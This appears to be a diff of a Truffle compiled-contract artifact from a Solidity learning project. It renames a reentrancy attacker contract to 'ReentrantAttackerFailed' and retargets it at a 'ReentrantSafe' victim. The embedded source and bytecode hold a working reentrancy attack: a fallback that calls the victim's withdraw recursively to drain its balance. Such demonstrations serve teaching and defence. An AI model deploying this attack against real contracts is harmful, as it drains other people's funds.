@@ -1,5 +1,5 @@
 {
-  "contractName": "ReentrantAttacker",
+  "contractName": "ReentrantAttackerFailed",
   "abi": [
     {
       "constant": false,
@@ -50,18 +50,18 @@
       "type": "fallback"
     }
   ],
-  "bytecode": "0x6060604052341561000f57600080fd5b6040516020806103bf83398101604052808051906020019091905050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506103448061007b6000396000f300606060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806341c0e1b514610133578063930c2003146101485780639e5faafc1461019d575b346000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631101515610131576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b151561011c57600080fd5b6102c65a03f1151561012d57600080fd5b5050505b005b341561013e57600080fd5b6101466101a7565b005b341561015357600080fd5b61015b6101c0565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6101a56101e5565b005b3373ffffffffffffffffffffffffffffffffffffffff16ff5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303818588803b151561026957600080fd5b6125ee5a03f1151561027a57600080fd5b505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b151561030257600080fd5b6102c65a03f1151561031357600080fd5b5050505600a165627a7a72305820d78a2d1985174b43fca6ffdbc082dc16210adf68cb06edd27299cc966a8141460029",
-  "deployedBytecode": "0x606060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806341c0e1b514610133578063930c2003146101485780639e5faafc1461019d575b346000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631101515610131576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b151561011c57600080fd5b6102c65a03f1151561012d57600080fd5b5050505b005b341561013e57600080fd5b6101466101a7565b005b341561015357600080fd5b61015b6101c0565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6101a56101e5565b005b3373ffffffffffffffffffffffffffffffffffffffff16ff5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303818588803b151561026957600080fd5b6125ee5a03f1151561027a57600080fd5b505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b151561030257600080fd5b6102c65a03f1151561031357600080fd5b5050505600a165627a7a72305820d78a2d1985174b43fca6ffdbc082dc16210adf68cb06edd27299cc966a8141460029",
-  "sourceMap": "105:1450:8:-;;;234:276;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;493:8;474:6;;:28;;;;;;;;;;;;;;;;;;234:276;105:1450;;;;;;",
-  "deployedSourceMap": "105:1450:8:-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1490:9;1472:6;;;;;;;;;;;:14;;;:27;;1468:77;;;1516:6;;;;;;;;;;;:15;;;:17;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1468:77;105:1450;558:227;;;;;;;;;;;;;;139:23;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;909:274;;;;;;558:227;605:10;592:24;;;139:23;;;;;;;;;;;;;:::o;909:274::-;953:6;;;;;;;;;;;:14;;;974:9;953:33;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1043:6;;;;;;;;;;;:15;;;:17;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;909:274::o",
-  "source": "pragma solidity ^0.4.18;\r\nimport \"./Reentrant.sol\";\r\n\r\n/// This contract would be owned by the attacker\r\ncontract ReentrantAttacker {\r\n    Reentrant public victim; // the contract instance I want to attack\r\n\r\n    /// Constructor\r\n    function ReentrantAttacker(address _address) public {\r\n        // _address is the address of the deployed Reentrant instance\r\n        // See 4_initial_migration.js\r\n        // deployer.deploy(ReentrantAttacker, Reentrant.address) \r\n        victim = Reentrant(_address);\r\n    }\r\n\r\n    /// Destroy this contract instance\r\n    function kill() public {\r\n        selfdestruct(msg.sender); // Caller will get back all the balance from this contract instance\r\n                                  // See Ownable.sol for a proper implementattion of kill()\r\n    }\r\n\r\n    /// Caller just provide a small amount to this function\r\n    /// the victim's balance will drained recursively\r\n    function attack() public payable {\r\n        victim.deposit.value(msg.value)(); // sender/attacker can deposit a small amount\r\n        victim.withdraw(); // victim's withdraw function is not re-entrant safe\r\n                           // below fallback will be invoked\r\n    }\r\n\r\n    function () public payable {\r\n        // this fallback will be recursively called by calling victim's withdraw\r\n        // to prevent infinite recursive stackoverflow or out of gas\r\n        // the stop condition is when victim's balance is less than attacking amount.\r\n        if (victim.balance >= msg.value) {\r\n            victim.withdraw();\r\n        }\r\n    }\r\n}",
-  "sourcePath": "C:\\dev\\ethereum\\solidity\\basics\\contracts\\ReentrantAttacker.sol",
+  "bytecode": "0x6060604052341561000f57600080fd5b6040516020806103bf83398101604052808051906020019091905050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506103448061007b6000396000f300606060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806341c0e1b514610133578063930c2003146101485780639e5faafc1461019d575b346000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631101515610131576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b151561011c57600080fd5b6102c65a03f1151561012d57600080fd5b5050505b005b341561013e57600080fd5b6101466101a7565b005b341561015357600080fd5b61015b6101c0565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6101a56101e5565b005b3373ffffffffffffffffffffffffffffffffffffffff16ff5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303818588803b151561026957600080fd5b6125ee5a03f1151561027a57600080fd5b505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b151561030257600080fd5b6102c65a03f1151561031357600080fd5b5050505600a165627a7a723058207919095967d7f47a6e52fb42b4118ecf7ca3e7c6018d66c1d56559a2a35215a00029",
+  "deployedBytecode": "0x606060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806341c0e1b514610133578063930c2003146101485780639e5faafc1461019d575b346000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631101515610131576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b151561011c57600080fd5b6102c65a03f1151561012d57600080fd5b5050505b005b341561013e57600080fd5b6101466101a7565b005b341561015357600080fd5b61015b6101c0565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6101a56101e5565b005b3373ffffffffffffffffffffffffffffffffffffffff16ff5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303818588803b151561026957600080fd5b6125ee5a03f1151561027a57600080fd5b505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b151561030257600080fd5b6102c65a03f1151561031357600080fd5b5050505600a165627a7a723058207919095967d7f47a6e52fb42b4118ecf7ca3e7c6018d66c1d56559a2a35215a00029",
+  "sourceMap": "109:1478:9:-;;;248:294;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;525:8;502:6;;:32;;;;;;;;;;;;;;;;;;248:294;109:1478;;;;;;",
+  "deployedSourceMap": "109:1478:9:-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1522:9;1504:6;;;;;;;;;;;:14;;;:27;;1500:77;;;1548:6;;;;;;;;;;;:15;;;:17;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1500:77;109:1478;590:227;;;;;;;;;;;;;;149:27;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;941:274;;;;;;590:227;637:10;624:24;;;149:27;;;;;;;;;;;;;:::o;941:274::-;985:6;;;;;;;;;;;:14;;;1006:9;985:33;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1075:6;;;;;;;;;;;:15;;;:17;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;941:274::o",
+  "source": "pragma solidity ^0.4.18;\r\nimport \"./ReentrantSafe.sol\";\r\n\r\n/// This contract would be owned by the attacker\r\ncontract ReentrantAttackerFailed {\r\n    ReentrantSafe public victim; // the contract instance I want to attack\r\n\r\n    /// Constructor\r\n    function ReentrantAttackerFailed(address _address) public {\r\n        // _address is the address of the deployed ReentrantSafe instance\r\n        // See 4_initial_migration.js\r\n        // deployer.deploy(ReentrantAttacker, ReentrantSafe.address) \r\n        victim = ReentrantSafe(_address);\r\n    }\r\n\r\n    /// Destroy this contract instance\r\n    function kill() public {\r\n        selfdestruct(msg.sender); // Caller will get back all the balance from this contract instance\r\n                                  // See Ownable.sol for a proper implementattion of kill()\r\n    }\r\n\r\n    /// Caller just provide a small amount to this function\r\n    /// the victim's balance will drained recursively\r\n    function attack() public payable {\r\n        victim.deposit.value(msg.value)(); // sender/attacker can deposit a small amount\r\n        victim.withdraw(); // victim's withdraw function is not re-entrant safe\r\n                           // below fallback will be invoked\r\n    }\r\n\r\n    function () public payable {\r\n        // this fallback will be recursively called by calling victim's withdraw\r\n        // to prevent infinite recursive stackoverflow or out of gas\r\n        // the stop condition is when victim's balance is less than attacking amount.\r\n        if (victim.balance >= msg.value) {\r\n            victim.withdraw();\r\n        }\r\n    }\r\n}",
+  "sourcePath": "C:\\dev\\ethereum\\solidity\\basics\\contracts\\ReentrantAttackerFailed.sol",
   "ast": {
     "attributes": {
-      "absolutePath": "/C/dev/ethereum/solidity/basics/contracts/ReentrantAttacker.sol",
+      "absolutePath": "/C/dev/ethereum/solidity/basics/contracts/ReentrantAttackerFailed.sol",
       "exportedSymbols": {
-        "ReentrantAttacker": [
-          376
+        "ReentrantAttackerFailed": [
+          438
         ]
       }
     },
@@ -75,24 +75,24 @@
             ".18"
           ]
         },
-        "id": 316,
+        "id": 378,
         "name": "PragmaDirective",
-        "src": "0:24:8"
+        "src": "0:24:9"
       },
       {
         "attributes": {
-          "SourceUnit": 315,
-          "absolutePath": "/C/dev/ethereum/solidity/basics/contracts/Reentrant.sol",
-          "file": "./Reentrant.sol",
-          "scope": 377,
+          "SourceUnit": 535,
+          "absolutePath": "/C/dev/ethereum/solidity/basics/contracts/ReentrantSafe.sol",
+          "file": "./ReentrantSafe.sol",
+          "scope": 439,
           "symbolAliases": [
             null
           ],
           "unitAlias": ""
         },
-        "id": 317,
+        "id": 379,
         "name": "ImportDirective",
-        "src": "26:25:8"
+        "src": "26:29:9"
       },
       {
         "attributes": {
@@ -106,20 +106,20 @@
           "documentation": "This contract would be owned by the attacker\r",
           "fullyImplemented": true,
           "linearizedBaseContracts": [
-            376
+            438
           ],
-          "name": "ReentrantAttacker",
-          "scope": 377
+          "name": "ReentrantAttackerFailed",
+          "scope": 439
         },
         "children": [
           {
             "attributes": {
               "constant": false,
               "name": "victim",
-              "scope": 376,
+              "scope": 438,
               "stateVariable": true,
               "storageLocation": "default",
-              "type": "contract Reentrant",
+              "type": "contract ReentrantSafe",
               "value": null,
               "visibility": "public"
             },
@@ -127,18 +127,18 @@
               {
                 "attributes": {
                   "contractScope": null,
-                  "name": "Reentrant",
-                  "referencedDeclaration": 314,
-                  "type": "contract Reentrant"
+                  "name": "ReentrantSafe",
+                  "referencedDeclaration": 534,
+                  "type": "contract ReentrantSafe"
                 },
-                "id": 318,
+                "id": 380,
                 "name": "UserDefinedTypeName",
-                "src": "139:9:8"
+                "src": "149:13:9"
               }
             ],
-            "id": 319,
+            "id": 381,
             "name": "VariableDeclaration",
-            "src": "139:23:8"
+            "src": "149:27:9"
           },
           {
             "attributes": {
@@ -148,9 +148,9 @@
               "modifiers": [
                 null
               ],
-              "name": "ReentrantAttacker",
+              "name": "ReentrantAttackerFailed",
               "payable": false,
-              "scope": 376,
+              "scope": 438,
               "stateMutability": "nonpayable",
               "superFunction": null,
               "visibility": "public"
@@ -162,7 +162,7 @@
                     "attributes": {
                       "constant": false,
                       "name": "_address",
-                      "scope": 331,
+                      "scope": 393,
                       "stateVariable": false,
                       "storageLocation": "default",
                       "type": "address",
@@ -175,19 +175,19 @@
                           "name": "address",
                           "type": "address"
                         },
-                        "id": 320,
+                        "id": 382,
                         "name": "ElementaryTypeName",
-                        "src": "261:7:8"
+                        "src": "281:7:9"
                       }
                     ],
-                    "id": 321,
+                    "id": 383,
                     "name": "VariableDeclaration",
-                    "src": "261:16:8"
+                    "src": "281:16:9"
                   }
                 ],
-                "id": 322,
+                "id": 384,
                 "name": "ParameterList",
-                "src": "260:18:8"
+                "src": "280:18:9"
               },
               {
                 "attributes": {
@@ -196,9 +196,9 @@
                   ]
                 },
                 "children": [],
-                "id": 323,
+                "id": 385,
                 "name": "ParameterList",
-                "src": "286:0:8"
+                "src": "306:0:9"
               },
               {
                 "children": [
@@ -212,7 +212,7 @@
                           "isPure": false,
                           "lValueRequested": false,
                           "operator": "=",
-                          "type": "contract Reentrant"
+                          "type": "contract ReentrantSafe"
                         },
                         "children": [
                           {
@@ -221,13 +221,13 @@
                               "overloadedDeclarations": [
                                 null
                               ],
-                              "referencedDeclaration": 319,
-                              "type": "contract Reentrant",
+                              "referencedDeclaration": 381,
+                              "type": "contract ReentrantSafe",
                               "value": "victim"
                             },
-                            "id": 324,
+                            "id": 386,
                             "name": "Identifier",
-                            "src": "474:6:8"
+                            "src": "502:6:9"
                           },
                           {
                             "attributes": {
@@ -240,7 +240,7 @@
                               "names": [
                                 null
                               ],
-                              "type": "contract Reentrant",
+                              "type": "contract ReentrantSafe",
                               "type_conversion": true
                             },
                             "children": [
@@ -255,13 +255,13 @@
                                   "overloadedDeclarations": [
                                     null
                                   ],
-                                  "referencedDeclaration": 314,
-                                  "type": "type(contract Reentrant)",
-                                  "value": "Reentrant"
+                                  "referencedDeclaration": 534,
+                                  "type": "type(contract ReentrantSafe)",
+                                  "value": "ReentrantSafe"
                                 },
-                                "id": 325,
+                                "id": 387,
                                 "name": "Identifier",
-                                "src": "483:9:8"
+                                "src": "511:13:9"
                               },
                               {
                                 "attributes": {
@@ -269,38 +269,38 @@
                                   "overloadedDeclarations": [
                                     null
                                   ],
-                                  "referencedDeclaration": 321,
+                                  "referencedDeclaration": 383,
                                   "type": "address",
                                   "value": "_address"
                                 },
-                                "id": 326,
+                                "id": 388,
                                 "name": "Identifier",
-                                "src": "493:8:8"
+                                "src": "525:8:9"
                               }
                             ],
-                            "id": 327,
+                            "id": 389,
                             "name": "FunctionCall",
-                            "src": "483:19:8"
+                            "src": "511:23:9"
                           }
                         ],
-                        "id": 328,
+                        "id": 390,
                         "name": "Assignment",
-                        "src": "474:28:8"
+                        "src": "502:32:9"
                       }
                     ],
-                    "id": 329,
+                    "id": 391,
                     "name": "ExpressionStatement",
-                    "src": "474:28:8"
+                    "src": "502:32:9"
                   }
                 ],
-                "id": 330,
+                "id": 392,
                 "name": "Block",
-                "src": "286:224:8"
+                "src": "306:236:9"
               }
             ],
-            "id": 331,
+            "id": 393,
             "name": "FunctionDefinition",
-            "src": "234:276:8"
+            "src": "248:294:9"
           },
           {
             "attributes": {
@@ -312,7 +312,7 @@
               ],
               "name": "kill",
               "payable": false,
-              "scope": 376,
+              "scope": 438,
               "stateMutability": "nonpayable",
               "superFunction": null,
               "visibility": "public"
@@ -325,9 +325,9 @@
                   ]
                 },
                 "children": [],
-                "id": 332,
+                "id": 394,
                 "name": "ParameterList",
-                "src": "571:2:8"
+                "src": "603:2:9"
               },
               {
                 "attributes": {
@@ -336,9 +336,9 @@
                   ]
                 },
                 "children": [],
-                "id": 333,
+                "id": 395,
                 "name": "ParameterList",
-                "src": "581:0:8"
+                "src": "613:0:9"
               },
               {
                 "children": [
@@ -374,9 +374,9 @@
                               "type": "function (address)",
                               "value": "selfdestruct"
                             },
-                            "id": 334,
+                            "id": 396,
                             "name": "Identifier",
-                            "src": "592:12:8"
+                            "src": "624:12:9"
                           },
                           {
                             "attributes": {
@@ -400,34 +400,34 @@
                                   "type": "msg",
                                   "value": "msg"
                                 },
-                                "id": 335,
+                                "id": 397,
                                 "name": "Identifier",
-                                "src": "605:3:8"
+                                "src": "637:3:9"
                               }
                             ],
-                            "id": 336,
+                            "id": 398,
                             "name": "MemberAccess",
-                            "src": "605:10:8"
+                            "src": "637:10:9"
                           }
                         ],
-                        "id": 337,
+                        "id": 399,
                         "name": "FunctionCall",
-                        "src": "592:24:8"
+                        "src": "624:24:9"
                       }
                     ],
-                    "id": 338,
+                    "id": 400,
                     "name": "ExpressionStatement",
-                    "src": "592:24:8"
+                    "src": "624:24:9"
                   }
                 ],
-                "id": 339,
+                "id": 401,
                 "name": "Block",
-                "src": "581:204:8"
+                "src": "613:204:9"
               }
             ],
-            "id": 340,
+            "id": 402,
             "name": "FunctionDefinition",
-            "src": "558:227:8"
+            "src": "590:227:9"
           },
           {
             "attributes": {
@@ -439,7 +439,7 @@
               ],
               "name": "attack",
               "payable": true,
-              "scope": 376,
+              "scope": 438,
               "stateMutability": "payable",
               "superFunction": null,
               "visibility": "public"
@@ -452,9 +452,9 @@
                   ]
                 },
                 "children": [],
-                "id": 341,
+                "id": 403,
                 "name": "ParameterList",
-                "src": "924:2:8"
+                "src": "956:2:9"
               },
               {
                 "attributes": {
@@ -463,9 +463,9 @@
                   ]
                 },
                 "children": [],
-                "id": 342,
+                "id": 404,
                 "name": "ParameterList",
-                "src": "942:0:8"
+                "src": "974:0:9"
               },
               {
                 "children": [
@@ -531,7 +531,7 @@
                                       "isPure": false,
                                       "lValueRequested": false,
                                       "member_name": "deposit",
-                                      "referencedDeclaration": 256,
+                                      "referencedDeclaration": 472,
                                       "type": "function () payable external"
                                     },
                                     "children": [
@@ -541,23 +541,23 @@
                                           "overloadedDeclarations": [
                                             null
                                           ],
-                                          "referencedDeclaration": 319,
-                                          "type": "contract Reentrant",
+                                          "referencedDeclaration": 381,
+                                          "type": "contract ReentrantSafe",
                                           "value": "victim"
                                         },
-                                        "id": 343,
+                                        "id": 405,
                                         "name": "Identifier",
-                                        "src": "953:6:8"
+                                        "src": "985:6:9"
                                       }
                                     ],
-                                    "id": 346,
+                                    "id": 408,
                                     "name": "MemberAccess",
-                                    "src": "953:14:8"
+                                    "src": "985:14:9"
                                   }
                                 ],
-                                "id": 347,
+                                "id": 409,
                                 "name": "MemberAccess",
-                                "src": "953:20:8"
+                                "src": "985:20:9"
                               },
                               {
                                 "attributes": {
@@ -581,29 +581,29 @@
                                       "type": "msg",
                                       "value": "msg"
                                     },
-                                    "id": 348,
+                                    "id": 410,
                                     "name": "Identifier",
-                                    "src": "974:3:8"
+                                    "src": "1006:3:9"
                                   }
                                 ],
-                                "id": 349,
+                                "id": 411,
                                 "name": "MemberAccess",
-                                "src": "974:9:8"
+                                "src": "1006:9:9"
                               }
                             ],
-                            "id": 350,
+                            "id": 412,
                             "name": "FunctionCall",
-                            "src": "953:31:8"
+                            "src": "985:31:9"
                           }
                         ],
-                        "id": 351,
+                        "id": 413,
                         "name": "FunctionCall",
-                        "src": "953:33:8"
+                        "src": "985:33:9"
                       }
                     ],
-                    "id": 352,
+                    "id": 414,
                     "name": "ExpressionStatement",
-                    "src": "953:33:8"
+                    "src": "985:33:9"
                   },
                   {
                     "children": [
@@ -635,7 +635,7 @@
                               "isPure": false,
                               "lValueRequested": false,
                               "member_name": "withdraw",
-                              "referencedDeclaration": 298,
+                              "referencedDeclaration": 518,
                               "type": "function () external"
                             },
                             "children": [
@@ -645,38 +645,38 @@
                                   "overloadedDeclarations": [
                                     null
                                   ],
-                                  "referencedDeclaration": 319,
-                                  "type": "contract Reentrant",
+                                  "referencedDeclaration": 381,
+                                  "type": "contract ReentrantSafe",
                                   "value": "victim"
                                 },
-                                "id": 353,
+                                "id": 415,
                                 "name": "Identifier",
-                                "src": "1043:6:8"
+                                "src": "1075:6:9"
                               }
                             ],
-                            "id": 355,
+                            "id": 417,
                             "name": "MemberAccess",
-                            "src": "1043:15:8"
+                            "src": "1075:15:9"
                           }
                         ],
-                        "id": 356,
+                        "id": 418,
                         "name": "FunctionCall",
-                        "src": "1043:17:8"
+                        "src": "1075:17:9"
                       }
                     ],
-                    "id": 357,
+                    "id": 419,
                     "name": "ExpressionStatement",
-                    "src": "1043:17:8"
+                    "src": "1075:17:9"
                   }
                 ],
-                "id": 358,
+                "id": 420,
                 "name": "Block",
-                "src": "942:241:8"
+                "src": "974:241:9"
               }
             ],
-            "id": 359,
+            "id": 421,
             "name": "FunctionDefinition",
-            "src": "909:274:8"
+            "src": "941:274:9"
           },
           {
             "attributes": {
@@ -688,7 +688,7 @@
               ],
               "name": "",
               "payable": true,
-              "scope": 376,
+              "scope": 438,
               "stateMutability": "payable",
               "superFunction": null,
               "visibility": "public"
@@ -701,9 +701,9 @@
                   ]
                 },
                 "children": [],
-                "id": 360,
+                "id": 422,
                 "name": "ParameterList",
-                "src": "1200:2:8"
+                "src": "1232:2:9"
               },
               {
                 "attributes": {
@@ -712,9 +712,9 @@
                   ]
                 },
                 "children": [],
-                "id": 361,
+                "id": 423,
                 "name": "ParameterList",
-                "src": "1218:0:8"
+                "src": "1250:0:9"
               },
               {
                 "children": [
@@ -756,18 +756,18 @@
                                   "overloadedDeclarations": [
                                     null
                                   ],
-                                  "referencedDeclaration": 319,
-                                  "type": "contract Reentrant",
+                                  "referencedDeclaration": 381,
+                                  "type": "contract ReentrantSafe",
                                   "value": "victim"
                                 },
-                                "id": 362,
+                                "id": 424,
                                 "name": "Identifier",
-                                "src": "1472:6:8"
+                                "src": "1504:6:9"
                               }
                             ],
-                            "id": 363,
+                            "id": 425,
                             "name": "MemberAccess",
-                            "src": "1472:14:8"
+                            "src": "1504:14:9"
                           },
                           {
                             "attributes": {
@@ -791,19 +791,19 @@
                                   "type": "msg",
                                   "value": "msg"
                                 },
-                                "id": 364,
+                                "id": 426,
                                 "name": "Identifier",
-                                "src": "1490:3:8"
+                                "src": "1522:3:9"
                               }
                             ],
-                            "id": 365,
+                            "id": 427,
                             "name": "MemberAccess",
-                            "src": "1490:9:8"
+                            "src": "1522:9:9"
                           }
                         ],
-                        "id": 366,
+                        "id": 428,
                         "name": "BinaryOperation",
-                        "src": "1472:27:8"
+                        "src": "1504:27:9"
                       },
                       {
                         "children": [
@@ -837,7 +837,7 @@
                                       "isPure": false,
                                       "lValueRequested": false,
                                       "member_name": "withdraw",
-                                      "referencedDeclaration": 298,
+                                      "referencedDeclaration": 518,
                                       "type": "function () external"
                                     },
                                     "children": [
@@ -847,58 +847,58 @@
                                           "overloadedDeclarations": [
                                             null
                                           ],
-                                          "referencedDeclaration": 319,
-                                          "type": "contract Reentrant",
+                                          "referencedDeclaration": 381,
+                                          "type": "contract ReentrantSafe",
                                           "value": "victim"
                                         },
-                                        "id": 367,
+                                        "id": 429,
                                         "name": "Identifier",
-                                        "src": "1516:6:8"
+                                        "src": "1548:6:9"
                                       }
                                     ],
-                                    "id": 369,
+                                    "id": 431,
                                     "name": "MemberAccess",
-                                    "src": "1516:15:8"
+                                    "src": "1548:15:9"
                                   }
                                 ],
-                                "id": 370,
+                                "id": 432,
                                 "name": "FunctionCall",
-                                "src": "1516:17:8"
+                                "src": "1548:17:9"
                               }
                             ],
-                            "id": 371,
+                            "id": 433,
                             "name": "ExpressionStatement",
-                            "src": "1516:17:8"
+                            "src": "1548:17:9"
                           }
                         ],
-                        "id": 372,
+                        "id": 434,
                         "name": "Block",
-                        "src": "1501:44:8"
+                        "src": "1533:44:9"
                       }
                     ],
-                    "id": 373,
+                    "id": 435,
                     "name": "IfStatement",
-                    "src": "1468:77:8"
+                    "src": "1500:77:9"
                   }
                 ],
-                "id": 374,
+                "id": 436,
                 "name": "Block",
-                "src": "1218:334:8"
+                "src": "1250:334:9"
               }
             ],
-            "id": 375,
+            "id": 437,
             "name": "FunctionDefinition",
-            "src": "1191:361:8"
+            "src": "1223:361:9"
           }
         ],
-        "id": 376,
+        "id": 438,
         "name": "ContractDefinition",
-        "src": "105:1450:8"
+        "src": "109:1478:9"
       }
     ],
-    "id": 377,
+    "id": 439,
     "name": "SourceUnit",
-    "src": "0:1555:8"
+    "src": "0:1587:9"
   },
   "compiler": {
     "name": "solc",
@@ -908,9 +908,9 @@
     "4447": {
       "events": {},
       "links": {},
-      "address": "0x30753e4a8aad7f8597332e813735def5dd395028"
+      "address": "0x75c35c980c0d37ef46df04d31a140b65503c0eed"
     }
   },
   "schemaVersion": "1.0.1",
-  "updatedAt": "2017-12-08T03:20:07.566Z"
+  "updatedAt": "2017-12-08T03:20:07.945Z"
 }
